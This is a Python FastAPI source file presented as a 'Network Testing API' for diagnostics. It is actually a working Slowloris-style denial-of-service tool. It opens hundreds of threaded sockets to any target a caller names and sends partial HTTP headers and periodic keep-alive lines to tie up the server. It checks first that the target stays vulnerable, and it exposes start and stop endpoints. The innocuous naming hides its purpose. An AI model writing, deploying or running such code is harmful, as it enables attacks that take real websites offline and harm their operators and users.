from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import socket
import random
import asyncio
import threading
import time

app = FastAPI(title="Network Testing API", description="API to perform network diagnostics and check server response behavior.", version="1.0")

process_sessions = {}

class ProcessRequest(BaseModel):
    target: str
    port: int = 80
    max_connections: int = 500
    thread_count: int = 10
    timeout: int = 4

def create_socket(target, port, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target, port))
        s.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target}\r\n".encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s
    except socket.error:
        return None

async def send_keep_alive(sock, target, sockets_list):
    try:
        await asyncio.sleep(random.uniform(5, 15))
        sock.send("X-a: keep-alive\r\n".encode("utf-8"))
    except socket.error:
        if sock in sockets_list:
            sockets_list.remove(sock)

async def process_task(target, port, max_connections, thread_count, timeout):
    if target in process_sessions and process_sessions[target]["running"]:
        return
    
    sockets_list = []
    process_sessions[target] = {"running": True, "sockets": sockets_list}
    
    for _ in range(max_connections):
        sock = create_socket(target, port, timeout)
        if sock:
            sockets_list.append(sock)

    async def maintain_connections():
        while process_sessions[target]["running"]:
            tasks = [send_keep_alive(s, target, sockets_list) for s in sockets_list]
            for _ in range(max_connections - len(sockets_list)):
                sock = create_socket(target, port, timeout)
                if sock:
                    sockets_list.append(sock)
            await asyncio.gather(*tasks)
            await asyncio.sleep(10)
    
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=lambda: asyncio.run(maintain_connections()))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

def check_response_behavior(target, port):
    test_sockets = []
    try:
        for _ in range(50):
            s = create_socket(target, port, 4)
            if s:
                test_sockets.append(s)
                s.send("X-Test: connection-check\r\n".encode("utf-8"))
                time.sleep(1)
        time.sleep(10)
        for s in test_sockets:
            try:
                s.send("X-Test: response-check\r\n".encode("utf-8"))
            except socket.error:
                return False
        return True
    finally:
        for s in test_sockets:
            s.close()

@app.post("/start/", summary="Start Network Test")
async def start_process(data: ProcessRequest):
    target = data.target
    port = data.port
    max_connections = data.max_connections
    thread_count = data.thread_count
    timeout = data.timeout

    if target in process_sessions and process_sessions[target]["running"]:
        raise HTTPException(status_code=400, detail="Process already running on this target")
    
    if not check_response_behavior(target, port):
        raise HTTPException(status_code=400, detail="Target does not meet required conditions")
    
    thread = threading.Thread(target=lambda: asyncio.run(process_task(target, port, max_connections, thread_count, timeout)))
    thread.start()
    print(f"Process started on {target}:{port}", "max_connections", max_connections, "thread_count", thread_count)
    return {"message": f"Process started on {target}:{port}", "max_connections": max_connections, "thread_count": thread_count}


class StopRequest(BaseModel):
    target: str

@app.post("/stop/", summary="Stop Process")
async def stop_process(data: StopRequest):
    target = data.target
    if target not in process_sessions or not process_sessions[target]["running"]:
        raise HTTPException(status_code=400, detail="No active process on this target")
    process_sessions[target]["running"] = False
    process_sessions[target]["sockets"].clear()
    return {"message": f"Process stopped on {target}"}

@app.get("/status", summary="Get Process Status")
async def get_status():
    return {"active_processes": [target for target, session in process_sessions.items() if session["running"]]}
